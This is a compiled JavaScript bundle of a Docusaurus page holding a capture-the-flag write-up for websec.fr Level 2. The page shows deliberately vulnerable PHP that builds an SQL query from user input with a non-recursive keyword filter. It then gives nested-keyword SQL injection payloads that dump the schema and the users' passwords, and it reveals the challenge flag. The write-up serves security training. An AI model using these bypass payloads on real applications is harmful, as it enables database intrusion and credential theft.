"use strict";(self.webpackChunkwebsite=self.webpackChunkwebsite||[]).push([[3296],{3905:function(e,t,n){n.d(t,{Zo:function(){return c},kt:function(){return m}});var r=n(7294);function a(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function o(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);t&&(r=r.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,r)}return n}function i(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?o(Object(n),!0).forEach((function(t){a(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):o(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function l(e,t){if(null==e)return{};var n,r,a=function(e,t){if(null==e)return{};var n,r,a={},o=Object.keys(e);for(r=0;r<o.length;r++)n=o[r],t.indexOf(n)>=0||(a[n]=e[n]);return a}(e,t);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(r=0;r<o.length;r++)n=o[r],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(a[n]=e[n])}return a}var p=r.createContext({}),s=function(e){var t=r.useContext(p),n=t;return e&&(n="function"==typeof e?e(t):i(i({},t),e)),n},c=function(e){var t=s(e.components);return r.createElement(p.Provider,{value:t},e.children)},u={inlineCode:"code",wrapper:function(e){var t=e.children;return r.createElement(r.Fragment,{},t)}},d=r.forwardRef((function(e,t){var n=e.components,a=e.mdxType,o=e.originalType,p=e.parentName,c=l(e,["components","mdxType","originalType","parentName"]),d=s(n),m=a,f=d["".concat(p,".").concat(m)]||d[m]||u[m]||o;return n?r.createElement(f,i(i({ref:t},c),{},{components:n})):r.createElement(f,i({ref:t},c))}));function m(e,t){var n=arguments,a=t&&t.mdxType;if("string"==typeof e||a){var o=n.length,i=new Array(o);i[0]=d;var l={};for(var p in t)hasOwnProperty.call(t,p)&&(l[p]=t[p]);l.originalType=e,l.mdxType="string"==typeof e?e:a,i[1]=l;for(var s=2;s<o;s++)i[s]=n[s];return r.createElement.apply(null,i)}return r.createElement.apply(null,n)}d.displayName="MDXCreateElement"},8856:function(e,t,n){n.r(t),n.d(t,{frontMatter:function(){return l},contentTitle:function(){return p},metadata:function(){return s},toc:function(){return c},default:function(){return d}});var r=n(7462),a=n(3366),o=(n(7294),n(3905)),i=["components"],l={},p="Level 2",s={unversionedId:"websec.fr/level02",id:"websec.fr/level02",isDocsHomePage:!1,title:"Level 2",description:"Description",source:"@site/docs/websec.fr/level02.md",sourceDirName:"websec.fr",slug:"/websec.fr/level02",permalink:"/Writeups/docs/websec.fr/level02",editUrl:"https://github.com/datthinh1801/Writupes/tree/main/website/docs/websec.fr/level02.md",tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Level 1",permalink:"/Writeups/docs/websec.fr/level01"},next:{title:"Level 3",permalink:"/Writeups/docs/websec.fr/level03"}},c=[{value:"Description",id:"description",children:[]},{value:"Solution",id:"solution",children:[]},{value:"Exploitation",id:"exploitation",children:[]}],u={toc:c};function d(e){var t=e.components,n=(0,a.Z)(e,i);return(0,o.kt)("wrapper",(0,r.Z)({},u,n,{components:t,mdxType:"MDXLayout"}),(0,o.kt)("h1",{id:"level-2"},"Level 2"),(0,o.kt)("h2",{id:"description"},"Description"),(0,o.kt)("p",null,"Challenge URL: ",(0,o.kt)("a",{parentName:"p",href:"https://websec.fr/level02/index.php"},"https://websec.fr/level02/index.php"),"  "),(0,o.kt)("p",null,"This application is the same as the ",(0,o.kt)("a",{parentName:"p",href:"https://websec.fr/level01/index.php"},"previous one")," (You can ",(0,o.kt)("a",{parentName:"p",href:"https://websec.fr/level02/source.php"},"check by yourself")," if you don't trust us). However, the developers saw the logs and found that the application was being attacked so they filtered out some of the database keywords which made it possible."),(0,o.kt)("p",null,"The following keywords were found to be filtered by the application using ",(0,o.kt)("a",{parentName:"p",href:"https://secure.php.net/preg_replace"},"preg_replace ()"),": ",(0,o.kt)("inlineCode",{parentName:"p"},"union"),", ",(0,o.kt)("inlineCode",{parentName:"p"},"order"),", ",(0,o.kt)("inlineCode",{parentName:"p"},"select"),", ",(0,o.kt)("inlineCode",{parentName:"p"},"from"),", ",(0,o.kt)("inlineCode",{parentName:"p"},"group"),", ",(0,o.kt)("inlineCode",{parentName:"p"},"by"),"."),(0,o.kt)("h2",{id:"solution"},"Solution"),(0,o.kt)("p",null,"The source of code of this challenge is:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-php"},"<?php\nini_set('display_errors', 'on');\n\nclass LevelTwo {\n    public function doQuery($injection) {\n        $pdo = new SQLite3('leveltwo.db', SQLITE3_OPEN_READONLY);\n\n        $searchWords = implode (['union', 'order', 'select', 'from', 'group', 'by'], '|');\n        $injection = preg_replace ('/' . $searchWords . '/i', '', $injection);\n\n        $query = 'SELECT id,username FROM users WHERE id=' . $injection . ' LIMIT 1';\n        $getUsers = $pdo->query ($query);\n        $users = $getUsers->fetchArray (SQLITE3_ASSOC);\n\n        if ($users) {\n            return $users;\n        }\n\n        return false;\n    }\n}\n\nif (isset ($_POST['submit']) && isset ($_POST['user_id'])) {\n    $lt = new LevelTwo ();\n    $userDetails = $lt->doQuery ($_POST['user_id']);\n}\n?>\n")),(0,o.kt)("p",null,"Here, the ",(0,o.kt)("inlineCode",{parentName:"p"},"implode()")," function joins words from the array with a ",(0,o.kt)("inlineCode",{parentName:"p"},"|")," as the separator. Next, the ",(0,o.kt)("inlineCode",{parentName:"p"},"preg_replace()")," performs ",(0,o.kt)("strong",{parentName:"p"},"find and replace")," operation."),(0,o.kt)("blockquote",null,(0,o.kt)("p",{parentName:"blockquote"},"The ",(0,o.kt)("inlineCode",{parentName:"p"},"/")," and ",(0,o.kt)("inlineCode",{parentName:"p"},"/i")," that wrap around the ",(0,o.kt)("inlineCode",{parentName:"p"},"$searchWords")," is the syntax to declare a regular expression pattern. ")),(0,o.kt)("p",null,"From these information, this application removes filtered words, namely ",(0,o.kt)("inlineCode",{parentName:"p"},"union"),", ",(0,o.kt)("inlineCode",{parentName:"p"},"order"),", ",(0,o.kt)("inlineCode",{parentName:"p"},"select"),", ",(0,o.kt)("inlineCode",{parentName:"p"},"from"),", ",(0,o.kt)("inlineCode",{parentName:"p"},"group"),", ",(0,o.kt)("inlineCode",{parentName:"p"},"by"),"."),(0,o.kt)("blockquote",null,(0,o.kt)("p",{parentName:"blockquote"},"Or we can see this on the challenge description.")),(0,o.kt)("h2",{id:"exploitation"},"Exploitation"),(0,o.kt)("p",null,"As we know that ",(0,o.kt)("inlineCode",{parentName:"p"},"union"),", ",(0,o.kt)("inlineCode",{parentName:"p"},"select"),", etc. will be replaced by an empty string ",(0,o.kt)("inlineCode",{parentName:"p"},"''"),", so the payload ",(0,o.kt)("inlineCode",{parentName:"p"},"0 UNION SELECT 1, 1")," will become ",(0,o.kt)("inlineCode",{parentName:"p"},"0  1, 1"),". However, this function does not perform ",(0,o.kt)("strong",{parentName:"p"},"recursive match and replace")," which means ",(0,o.kt)("inlineCode",{parentName:"p"},"UNIUNIONON")," will become ",(0,o.kt)("inlineCode",{parentName:"p"},"UNION"),".  "),(0,o.kt)("p",null,"What this in mind, we can craft a payload as follows:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-sql"},"0 UNIUNIONON SESELECTLECT name, sql FRFROMOM sqlite_master WHERE type='table'\n")),(0,o.kt)("p",null,"This results in  "),(0,o.kt)("p",null,(0,o.kt)("img",{parentName:"p",src:"https://user-images.githubusercontent.com/44528004/132819301-a05b1ec5-be10-4fff-969f-bf489e303cb7.png",alt:"image"}),"  "),(0,o.kt)("p",null,"Then, we craft another payload to extract ",(0,o.kt)("inlineCode",{parentName:"p"},"username")," and ",(0,o.kt)("inlineCode",{parentName:"p"},"password"),":"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-sql"},"0 UNIUNIONON SESELECTLECT username, password FRFROMOM users\n")),(0,o.kt)("p",null,"The result is  "),(0,o.kt)("p",null,(0,o.kt)("img",{parentName:"p",src:"https://user-images.githubusercontent.com/44528004/132819409-0ddf56ac-88c5-424e-86d7-ced858ab4617.png",alt:"image"})),(0,o.kt)("blockquote",null,(0,o.kt)("p",{parentName:"blockquote"},"Flag: ",(0,o.kt)("inlineCode",{parentName:"p"},"WEBSEC{BecauseBlacklistsAreOftenAgoodIdea}"))))}d.isMDXComponent=!0}}]);